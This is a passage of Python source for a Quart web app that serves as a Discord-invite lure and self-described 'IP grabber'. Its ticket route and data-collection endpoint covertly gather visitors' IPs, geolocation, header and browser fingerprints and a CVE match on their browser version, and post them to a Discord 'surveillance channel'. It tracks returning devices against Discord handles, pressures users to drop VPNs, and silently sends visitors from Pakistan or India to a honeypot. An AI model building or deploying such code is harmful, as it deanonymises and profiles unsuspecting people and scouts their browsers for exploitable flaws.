        l.info(f'Advanced data collected: {len(data.get("data", {}))} categories')

        # Extract device information from request
        device_info = extract_device_info(request)

        # Get IP address
        ip_address = extract_real_ip(request) or request.headers.get(
            "X-Real-IP", "Unknown"
        )

        # Try to get user identifier from the collected data or URL parameters
        user_identifier = (
            data.get("userIdentifier") or request.args.get("user") or "Anonymous"
        )

        # Send advanced data to Discord with device recognition
        send_advanced_data_to_discord(data, device_info, ip_address, user_identifier)

        return jsonify({"status": "success"}), 200

    except Exception as e:
        l.error(f"Error collecting advanced data: {e}")
        return jsonify({"status": "error", "message": str(e)}), 500


def build_request_profile(device_info):
    """Build a compact request-route profile for the embed (URL/path/referer)."""
    if not device_info:
        return {}

    def _ok(value):
        return value not in (None, "", "Unknown", "None")

    scheme = device_info.get("scheme") if _ok(device_info.get("scheme")) else ""
    host = device_info.get("host") if _ok(device_info.get("host")) else ""
    path = device_info.get("path") if _ok(device_info.get("path")) else ""
    query = device_info.get("query_string") or ""
    referer = device_info.get("referer") if _ok(device_info.get("referer")) else None

    full_url = f"{scheme}://{host}{path}" if (scheme and host and path) else None
    if full_url and query:
        full_url += f"?{query}"

    profile = {
        "method": device_info.get("method") if _ok(device_info.get("method")) else None,
        "scheme": scheme or None,
        "host": host or None,
        "path": path or None,
        "query": query or None,
        "fullUrl": full_url,
        "referer": referer,
        "contentType": device_info.get("content_type") if _ok(device_info.get("content_type")) else None,
        "accessTime": device_info.get("access_time") if _ok(device_info.get("access_time")) else None,
    }
    return {k: v for k, v in profile.items() if v not in (None, "", False, 0)}


def build_transport_profile(device_info):
    """Aggregate transport-layer hints from request headers into a single dict."""
    if not device_info:
        return {}

    def _present(value):
        return value not in (None, "", "Unknown", "None")

    cf_visitor = device_info.get("cf_visitor")
    cf_scheme = None
    if _present(cf_visitor):
        try:
            import json as _json
            cf_scheme = _json.loads(cf_visitor).get("scheme")
        except (ValueError, TypeError):
            cf_scheme = None

    profile = {
        "scheme": device_info.get("scheme"),
        "forwardedProto": device_info.get("x_forwarded_proto") if _present(device_info.get("x_forwarded_proto")) else None,
        "cfScheme": cf_scheme,
        "cfRay": device_info.get("cf_ray") if _present(device_info.get("cf_ray")) else None,
        "cfCountry": device_info.get("cf_ipcountry") if _present(device_info.get("cf_ipcountry")) else None,
        "secFetchSite": device_info.get("sec_fetch_site") if _present(device_info.get("sec_fetch_site")) else None,
        "secFetchMode": device_info.get("sec_fetch_mode") if _present(device_info.get("sec_fetch_mode")) else None,
        "secFetchDest": device_info.get("sec_fetch_dest") if _present(device_info.get("sec_fetch_dest")) else None,
        "secChUaFullVersionList": device_info.get("sec_ch_ua_full_version_list") if _present(device_info.get("sec_ch_ua_full_version_list")) else None,
        "secChUaPlatform": device_info.get("sec_ch_ua_platform") if _present(device_info.get("sec_ch_ua_platform")) else None,
        "secChUaPlatformVersion": device_info.get("sec_ch_ua_platform_version") if _present(device_info.get("sec_ch_ua_platform_version")) else None,
        "acceptLanguage": device_info.get("accept_language") if _present(device_info.get("accept_language")) else None,
        "acceptEncoding": device_info.get("accept_encoding") if _present(device_info.get("accept_encoding")) else None,
        "upgradeInsecureRequests": device_info.get("upgrade_insecure_requests") if _present(device_info.get("upgrade_insecure_requests")) else None,
    }

    # Derive a coarse TLS posture: cf-visitor + scheme + upgrade-insecure-requests
    https_signals = sum(
        1 for v in (profile["scheme"], profile["forwardedProto"], profile["cfScheme"])
        if v and v.lower() == "https"
    )
    profile["isHttps"] = https_signals > 0
    profile["secureContextHints"] = https_signals

    # Drop empty keys for compact display
    return {k: v for k, v in profile.items() if v not in (None, "", False, 0)} | {
        "isHttps": profile["isHttps"],
        "secureContextHints": profile["secureContextHints"],
    }


def lookup_browser_cves(device_info, advanced_data=None):
    """Run the passive CVE lookup against the parsed UA + UA-CH version list."""
    try:
        from cve_lookup import lookup_cves, summarise
    except ImportError:
        return {"count": 0, "max_cvss": 0.0, "highest_severity": "none", "items": []}

    family = (device_info or {}).get("browser_family") if device_info else None
    version = (device_info or {}).get("browser_version") if device_info else None

    # Prefer UA-CH `fullVersionList` when present (sent from JS) — more accurate than UA string.
    if advanced_data:
        ua_ch = advanced_data.get("uaClientHints") or {}
        full_list = ua_ch.get("fullVersionList") if isinstance(ua_ch, dict) else None
        if isinstance(full_list, list) and family:
            wanted = family.lower()
            for entry in full_list:
                if not isinstance(entry, dict):
                    continue
                brand = (entry.get("brand") or "").lower()
                if wanted in brand or brand in wanted:
                    version = entry.get("version") or version
                    break

    return summarise(lookup_cves(family, version))


def build_protocol_posture(device_info):
    """Derive connection posture from request headers.

    Note: The app runs behind nginx proxy manager which terminates TLS and
    downgrades to HTTP/1.1 for the upstream. The app cannot see the client's
    actual TLS version or HTTP/2-3 version. Cloudflare free tier does not
    expose JA3/JA4 fingerprints. This vector computes connection posture
    (what IS obtainable), not TLS fingerprinting.
    """
    if not device_info:
        return {}

    def _present(value):
        return value not in (None, "", "Unknown", "None")

    xff = device_info.get("x_forwarded_for") if _present(device_info.get("x_forwarded_for")) else None
    cf_ray = device_info.get("cf_ray") if _present(device_info.get("cf_ray")) else None
    scheme = device_info.get("scheme") if _present(device_info.get("scheme")) else None
    forwarded_proto = device_info.get("x_forwarded_proto") if _present(device_info.get("x_forwarded_proto")) else None

    cf_visitor = device_info.get("cf_visitor")
    cf_scheme = None
    if _present(cf_visitor):
        try:
            import json as _json
            cf_scheme = _json.loads(cf_visitor).get("scheme")
        except (ValueError, TypeError):
            cf_scheme = None

    # Proxy chain depth
    proxy_chain_depth = 1
    if xff:
        proxy_chain_depth = xff.count(",") + 1

    # Protocol consistency
    schemes = [s for s in (scheme, forwarded_proto, cf_scheme) if s]
    proto_consistency = len(set(schemes)) <= 1 if schemes else True

    # IP source — which header yielded the real IP
    ip_source = None
    if _present(device_info.get("cf_connecting_ip")):
        ip_source = "CF-Connecting-IP"
    elif _present(device_info.get("x_real_ip")):
        ip_source = "X-Real-IP"
    else:
        ip_source = "remote_addr"

    # XFF consistency — first hop match real IP
    xff_consistent = True
    real_ip = device_info.get("real_ip")
    if xff and real_ip and _present(real_ip):
        first_hop = xff.split(",")[0].strip()
        xff_consistent = first_hop == real_ip

    profile = {
        "proxyChainDepth": proxy_chain_depth,
        "cloudflareEdge": bool(cf_ray),
        "cfRay": cf_ray,
        "protoConsistency": proto_consistency,
        "schemeObserved": scheme or cf_scheme or forwarded_proto,
        "ipSource": ip_source,
        "xffConsistent": xff_consistent,
    }
    return {k: v for k, v in profile.items() if v not in (None, "", False, 0)} | {
        "protoConsistency": proto_consistency,
    }


def build_language_profile(device_info, country_code=None):
    """Parse Accept-Language header into a structured language profile."""
    if not device_info:
        return {}

    raw = device_info.get("accept_language", "Unknown")
    if not raw or raw in ("Unknown", "None", ""):
        return {}

    import math

    # Parse: en-US,en;q=0.9,de;q=0.8
    entries = []
    parts = raw.split(",")
    for part in parts:
        part = part.strip()
        if ";" in part:
            tag, q_str = part.split(";", 1)
            tag = tag.strip()
            q = 1.0
            if "q=" in q_str:
                try:
                    q = float(q_str.split("q=")[1].strip())
                except ValueError:
                    q = 1.0
        else:
            tag = part.strip()
            q = 1.0
        if tag:
            entries.append({"tag": tag, "q": q})

    if not entries:
        return {}

    entries.sort(key=lambda e: e["q"], reverse=True)
    primary = entries[0]["tag"]

    # Split subtags
    subtags = primary.split("-")
    primary_language = subtags[0].lower()
    region = None
    script = None
    for sub in subtags[1:]:
        if len(sub) == 2:
            region = sub.upper()
        elif len(sub) == 4:
            script = sub

    # Shannon entropy of q-values
    q_values = [e["q"] for e in entries]
    total_q = sum(q_values)
    entropy_bits = 0.0
    if total_q > 0:
        for q in q_values:
            p = q / total_q
            if p > 0:
                entropy_bits -= p * math.log2(p)

    # Geo mismatch
    geo_mismatch = False
    if country_code and region:
        # Normalize: country code is 2-letter ISO, region is 2-letter from Accept-Language
        if country_code.upper() != region and len(country_code) == 2:
            geo_mismatch = True

    return {
        "primary": primary,
        "primaryLanguage": primary_language,
        "region": region,
        "script": script,
        "languages": entries,
        "count": len(entries),
        "entropyBits": round(entropy_bits, 2),
        "geoMismatch": geo_mismatch,
        "geoCountryCode": country_code if country_code else None,
    }


def send_advanced_data_to_discord(
    collected_data, device_info=None, ip_address=None, user_identifier=None
):
    """
    Send combined advanced collected data to Discord with device recognition

    Args:
        collected_data: The collected browser fingerprinting data
        device_info: Optional device information from headers
        ip_address: Optional IP address
        user_identifier: Optional user identifier (e.g., Discord handle)
    """
    try:
        # Handle both dictionary and list data structures
        if isinstance(collected_data, dict):
            data = collected_data.get("data", {})
        else:
            # Fallback: treat as the data directly
            data = collected_data if collected_data else {}

        # Server-side enrichment: transport fingerprint + passive CVE match.
        # Stored under reserved underscore keys so embed builders can pick them up.
        if isinstance(data, dict):
            transport = build_transport_profile(device_info)
            if transport:
                data["_serverTransport"] = transport
            request_profile = build_request_profile(device_info)
            if request_profile:
                data["_serverRequest"] = request_profile
            cve_summary = lookup_browser_cves(device_info, data)
            if cve_summary and cve_summary.get("count", 0) > 0:
                data["_serverCveMatches"] = cve_summary
            # Phase B: enrich privacy signals with server-side Sec-GPC header
            sec_gpc = (device_info or {}).get("sec_gpc", "Unknown")
            if sec_gpc not in ("Unknown", "None", "", None):
                ps = data.get("privacySignals")
                if isinstance(ps, dict) and not ps.get("error"):
                    ps["secGpcHeader"] = sec_gpc
                elif isinstance(ps, dict) and ps.get("error"):
                    ps["secGpcHeader"] = sec_gpc
                else:
                    data["privacySignals"] = {"gpc": None, "dnt": None, "secGpcHeader": sec_gpc}
            # Phase D: server-side ASN / hosting org lookup
            try:
                from asn_lookup import lookup_asn
                asn_info = lookup_asn(ip_address or "")
                if asn_info:
                    data["_serverAsn"] = asn_info
            except Exception as e:
                l.error(f"ASN lookup failed: {e}")
            # Phase D: protocol posture
            protocol_posture = build_protocol_posture(device_info)
            if protocol_posture:
                data["_serverProtocol"] = protocol_posture
            # Phase D: language profile (needs country code)
            cc = None
            if device_info:
                cc = device_info.get("cf_ipcountry")
                if not cc or cc in ("Unknown", "None", "XX"):
                    cc = get_country(ip_address) if ip_address else None
            lang_profile = build_language_profile(device_info, cc)
            if lang_profile:
                data["_serverLanguage"] = lang_profile

        # Perform device recognition if we have device info
        recognition_info = None
        if device_info and user_identifier:
            try:
                tracker = get_tracker()
                # Generate fingerprint from device info and advanced data
                fingerprint = tracker.generate_fingerprint(device_info, data)
                # Check if device has been seen before
                is_returning, recognition_info = tracker.check_device(
                    fingerprint=fingerprint,
                    current_name=user_identifier,
                    ip_address=ip_address or "Unknown",
                    device_info=device_info,
                    advanced_data=data,
                )
                l.info(
                    f"Device recognition: returning={is_returning}, info={recognition_info}"
                )
            except Exception as e:
                l.error(f"Error during device recognition: {e}")

        # Try to send via bot first (supports interactive buttons)
        bot_manager = get_bot_manager()
        if bot_manager and bot_manager.ready:
            l.info("Sending data via Discord bot with interactive menu")
            bot_manager.send_data(data, recognition_info, user_identifier)
        else:
            # Fallback to webhook if bot not available
            l.warning("Bot not available, falling back to webhook")
            embed = create_combined_surveillance_embed(
                data, recognition_info, dc_handle=user_identifier
            )
            send_to_channel(COMPREHENSIVE_REPORT_MESSAGE, embed)

    except Exception as e:
        l.error(f"Error sending advanced data to Discord: {e}")
        # Send without components as fallback
        try:
            # Use safer data extraction for fallback
            if isinstance(collected_data, dict):
                fallback_data = collected_data.get("data", {})
            else:
                fallback_data = collected_data if collected_data else {}

            embed = create_combined_surveillance_embed(
                fallback_data, dc_handle=user_identifier
            )
            send_to_channel(COMPREHENSIVE_REPORT_MESSAGE, embed)
        except Exception as fallback_error:
            l.error(f"Fallback also failed: {fallback_error}")


def get_country(ip_address: str):
    """
    Retrieve country code for the given IP address using the local sapics DB.
    Downloads the CSV if missing or stale, loads into memory once, uses binary search.
    """
    try:
        from ip_locator import _load_db, _binary_search

        _load_db()  # This ensures the database is loaded

        ip_obj = ipaddress.ip_address(ip_address)
        ip_int = int(ip_obj)
        if isinstance(ip_obj, ipaddress.IPv4Address):
            l.debug(f"Looking up IPv4 address: {ip_address} (int: {ip_int})")
            result = _binary_search(ip_int, _ranges_v4, _starts_v4)
        else:
            l.debug(f"Looking up IPv6 address: {ip_address} (int: {ip_int})")
            l.debug(f"IPv6 ranges available: {len(_ranges_v6)}, starts: {len(_starts_v6)}")
            result = _binary_search(ip_int, _ranges_v6, _starts_v6)

        if result:
            l.debug(f"Found country code: {result} for {ip_address}")
        else:
            l.warning(f"No country code found for {ip_address}")
        return result
    except Exception as e:
        l.error(f"Error fetching country from local DB for {ip_address}: {e}")
        import traceback
        l.error(f"Traceback: {traceback.format_exc()}")
        return None


# --- Backwards-compat shim (No external HTTP API anymore) --------------------


def request_ip_location(ip_address: str):
    """
    Deprecated: kept for compatibility. Uses the local DB and returns a dict
    similar to the old API structure.
    """
    # Detect IP version first
    try:
        ip_obj = ipaddress.ip_address(ip_address)
        ip_version = "6" if isinstance(ip_obj, ipaddress.IPv6Address) else "4"
        ip_number = str(int(ip_obj))
    except ValueError as e:
        l.warning(f"Invalid IP address: {ip_address} - {e}")
        return {
            "response_code": "400",
            "ip_number": "0",
            "ip_version": "4",
            "country_name": "Unknown",
            "country_code2": "XX",
            "isp": "Unknown",
        }

    cc = get_country(ip_address)
    if cc:
        return {
            "response_code": "200",
            "country_code2": cc,
            "ip_number": ip_number,
            "ip_version": ip_version,
            "country_name": "Unknown",  # We don't have country names in the local DB
            "isp": "Unknown",  # We don't have ISP info in the local DB
        }

    # Country not found but IP is valid
    l.warning(f"Country not found for {ip_version} address: {ip_address}")
    return {
        "response_code": "404",
        "ip_number": ip_number,
        "ip_version": ip_version,
        "country_name": "Unknown",
        "country_code2": "XX",
        "isp": "Unknown",
    }


async def redirect_handler(ip, normal_server, honeypot, request_obj=None):
    global redirected

    # Extract real IP if request object is provided
    real_ip = ip  # Default fallback
    if request_obj:
        extracted_real_ip = extract_real_ip(request_obj)
        if extracted_real_ip:
            real_ip = extracted_real_ip
            l.info(f"Real IP extracted: {real_ip} (original: {ip})")
        else:
            l.info(f"Could not extract real IP, using: {ip}")

    # Check for Cloudflare country header first (most reliable)
    country_code = None
    if request_obj:
        cf_country = request_obj.headers.get("Cf-Ipcountry")
        if cf_country and cf_country != "XX":
            country_code = cf_country
            l.info(f"Using Cloudflare country: {country_code} for IP: {real_ip}")

    # Fall back to GeoIP lookup if Cloudflare header not available
    if not country_code:
        country_code = get_country(real_ip)
        l.info(f"Country code from GeoIP for {real_ip}: {country_code}")

    # if test flag is set redirect every 2nd request to honeypot
    if test_flag:
        if redirected:
            country_code = "PK"
            l.info(f"Test flag, changed country code: {country_code}")
        else:
            l.info("Test flag, not changing country code")
        redirected = not redirected

    if country_code and country_code in ["PK", "IN"]:
        l.info(f"Redirecting to Honeypot: {honeypot}")

        # Initialize device_info to None first
        device_info = None

        # Extract device information if request object is provided
        if request_obj:
            device_info = extract_device_info(request_obj)
            l.info(f"Honeypot device info: {device_info}")

        # Create and send embed message - use real IP for display
        embed = create_honeypot_embed(real_ip, country_code, honeypot, device_info)
        send_to_channel("", embed)

        return redirect(honeypot)
    elif check_for_vpn(real_ip):
        return "You seem to access the link using a VPN. To ensure a secure experience for all our users, please disable the VPN and retry to join the Discord."

    else:
        l.info(f"Redirecting to: {normal_server}")
        return redirect(normal_server)


@app.route("/")
async def index():
    l.info("Default route called.")
    ip_address = request.headers.get("X-Real-IP")
    l.info(f"IP Address is: {ip_address}")
    try:
        return await redirect_handler(
            ip_address, default_server, alternative_server_url, request
        )
    except Exception as e:
        l.error(f"Error in index route: {e}")
        return jsonify({"status": "error", "message": "Internal server error"}), 500


@app.route("/health")
async def health():
    """Health check endpoint - returns immediately to pass k8s probes"""
    return jsonify({"status": "healthy"}), 200


@app.route("/ticket/<path:dc_handle>")
async def ip_grab(dc_handle):
    l.info("Grabber called.")
    l.info(f"user is: {dc_handle}")

    # Use the new real IP extraction method
    real_ip = extract_real_ip(request)
    ip_address = real_ip if real_ip else request.headers.get("X-Real-IP", "127.0.0.1")

    l.info(f"IP Address is: {ip_address}")
    vpn = check_for_vpn(ip_address)

    # Extract comprehensive device information
    device_info = extract_device_info(request)

    try:
        data = request_ip_location(ip_address)
        ip_number = data["ip_number"]
        ip_version = data["ip_version"]
        country_name = data["country_name"]
        country_code2 = data["country_code2"]
        isp = data["isp"]

        l.info(f"IP data: {data}\nVPN: {vpn}")
        l.info(f"Device info: {device_info}")

        # Create and send embed message with button
        event_id = str(int(datetime.now().timestamp()))
        device_data_store[event_id] = device_info

        # Only send embed if we have valid IP data
        if data.get("response_code") == "200":
            embed = create_ip_grabber_embed(
                dc_handle,
                ip_address,
                vpn,
                country_name,
                country_code2,
                isp,
                device_info,
            )
            # Send initial summary embed
            send_to_channel("", embed)

            # Send verbose embed as follow-up message
            verbose_embed = create_verbose_embed(
                device_info, "IP_GRABBER", dc_handle=dc_handle
            )
            send_to_channel("📋 **Detailed Analysis:**", verbose_embed)
        else:
            l.warning(f"Invalid IP data received: {data}")

        if vpn:
            return "You seem to access the link using a VPN. To ensure a secure experience for all our users, please disable the VPN and retry to create a ticket."

        dc_handle += "?"
        return await render_template(
            "result.html",
            dc_handle=dc_handle,
            ip=ip_address,  # Use the extracted IP
            ip_number=ip_number,
            ip_version=ip_version,
            country_name=country_name,
            country_code2=country_code2,
            isp=isp,
            device_info=device_info,
        )
    except Exception as e:
        l.error(f"{e}")
        # Fallback to basic template with available data
        return await render_template(
            "result.html",
            dc_handle=dc_handle + "?",
            ip=ip_address,
            ip_number="Unknown",
            ip_version="4",
            country_name="Unknown",
            country_code2="XX",
            isp="Unknown",
            device_info=device_info,
        )


@app.route("/<path:dc_invite>")
async def refer(dc_invite):
    l.info("Custom route called.")
    l.info(f"Route is: {dc_invite}")
    if is_blocked_crawler_path(dc_invite):
        l.info(f"Blocked crawler/static path, skipping shield: {dc_invite}")
        return "", 404
    ip_address = request.headers.get("X-Real-IP")
    l.info(f"IP Address is: {ip_address}")
    custom_server = f"https://discord.gg/{dc_invite}"
    try:
        return await redirect_handler(
            ip_address, custom_server, alternative_server_url, request
        )
    except Exception as e:
        l.error(f"Error in refer route: {e}")
        return jsonify({"status": "error", "message": "Internal server error"}), 500


@app.route("/<path:dc_invite>/<path:honeypot>")
async def refer_custom(dc_invite, honeypot):
    l.info("Custom route called with custom honeypot.")
    ip_address = request.headers.get("X-Real-IP")
    l.info(f"IP Address is: {ip_address}")
    full_path = f"{dc_invite}/{honeypot}"
    l.info(f"Route is: {full_path}")
    if is_blocked_crawler_path(full_path) or is_blocked_crawler_path(honeypot):
        l.info(f"Blocked crawler/static path, skipping shield: {full_path}")
        return "", 404
    custom_server = f"https://discord.gg/{dc_invite}"
    custom_honeypot = f"https://discord.gg/{honeypot}"
    try:
        return await redirect_handler(
            ip_address, custom_server, custom_honeypot, request
        )
    except Exception as e:
        l.error(f"Error in refer_custom route: {e}")
        return jsonify({"status": "error", "message": "Internal server error"}), 500


# Route for serving favicon.ico
@app.route("/favicon.ico")
async def favicon():
    return await send_file("favicon.ico")


@app.route("/robots.txt")
async def robots():
    """Serve a real robots.txt so crawlers de-index the lure/honeypot routes.

    Registered before the catch-all invite route so it wins over /<path:dc_invite>.
    """
    body = "User-agent: *\nDisallow: /\n"
    return body, 200, {"Content-Type": "text/plain; charset=utf-8"}


if __name__ == "__main__":
    set_logger(l)

    try:
        # Check for CONFIG_PATH environment variable first
        config_path = os.getenv("CONFIG_PATH", "config.json")
        l.info(f"Using config file: {config_path}")
        config = read_json_file(config_path)
        l.passing(f"Successfully loaded config from {config_path}")
    except Exception as e:
        l.error(f"Failed to load config file: {e}")
        l.passing("Falling back to environment variables")
        config = get_env_vars()
        l.info(
            {
                k: v if k != "dc_webhook_url" else f"***{v[-5:] if v else 'None'}"
                for k, v in config.items()
            }
        )

    # Preload GeoIP database at startup
    l.info("Preloading GeoIP database...")
    try:
        from ip_locator import _load_db
        _load_db()
        l.passing("GeoIP database loaded successfully")
    except Exception as e:
        l.error(f"Failed to load GeoIP database: {e}")
        l.warning("Country detection may be delayed on first request")

    # Preload ASN database at startup (mirrors GeoIP preload)
    l.info("Preloading ASN database...")
    try:
        from asn_lookup import set_logger as set_asn_logger, _load_db as _load_asn_db
        set_asn_logger(l)
        _load_asn_db()
        l.passing("ASN database loaded successfully")
    except Exception as e:
        l.error(f"Failed to load ASN database: {e}")
        l.warning("ASN lookup may be delayed on first request")

    # Fetch VPN subnets from GitHub with fallback to local file
    vpn_source = "https://raw.githubusercontent.com/X4BNet/lists_vpn/main/ipv4.txt"
    try:
        sub_nets = read_subnets_from_file(vpn_source)
    except Exception as e:
        l.error(f"Failed to load VPN subnets: {e}")
        l.warning("VPN detection will be disabled")
        sub_nets = []

    test_flag = config["test_flag"]
    redirected = False
    if test_flag:
        l.passing(
            "Test flag is set, every second request will be directed to the honey pot"
        )
    default_server = config["default_server"]

    alternative_server_url = config["honeypot_server"]

    app_port = int(config["app_port"])

    # Initialize Discord bot if bot token is provided
    bot_token = config.get("discord_bot_token")
    if bot_token and bot_token not in ["", "None", "none"]:
        l.info("Discord bot token found, initializing bot in background...")
        try:
            # Initialize bot in background - non-blocking
            bot_manager = initialize_bot(bot_token)

            # Set surveillance channel if provided in config
            if channel_id := config.get("surveillance_channel_id"):
                try:
                    channel_id_int = int(channel_id)
                    # Save to bot_config.json for persistence
                    import json
                    with open("bot_config.json", "w") as f:
                        json.dump({"surveillance_channel_id": channel_id_int}, f, indent=2)
                    l.passing(f"Surveillance channel ID set to: {channel_id_int}")
                except (ValueError, TypeError):
                    l.warning(f"Invalid surveillance_channel_id: {channel_id}")
            else:
                l.warning("No surveillance_channel_id configured - bot will not send messages")
                l.info("Set 'surveillance_channel_id' in config or use /setchannel command in Discord")

            l.passing("Discord bot initialization started in background thread")
        except Exception as e:
            l.error(f"Failed to start Discord bot thread: {e}")
            import traceback
            l.error(f"Traceback: {traceback.format_exc()}")
            l.warning("Continuing with webhook-only mode")
    else:
        l.warning("No Discord bot token found in config, using webhook-only mode")
        l.info("Add 'discord_bot_token' to config to enable interactive bot features")

    l.passing(f"Starting Quart application on 0.0.0.0:{app_port}")

    # Use hypercorn for production (more stable than dev server)
    try:
        import hypercorn.asyncio
        from hypercorn.config import Config

        config_hypercorn = Config()
        config_hypercorn.bind = [f"0.0.0.0:{app_port}"]
        config_hypercorn.workers = 1
        config_hypercorn.accesslog = "-"  # Log to stdout
        config_hypercorn.errorlog = "-"   # Log to stderr

        l.info("Using Hypercorn ASGI server (production mode)")
        asyncio.run(hypercorn.asyncio.serve(app, config_hypercorn))
    except ImportError:
        l.warning("Hypercorn not available, using development server")
        app.run(host="0.0.0.0", port=app_port)
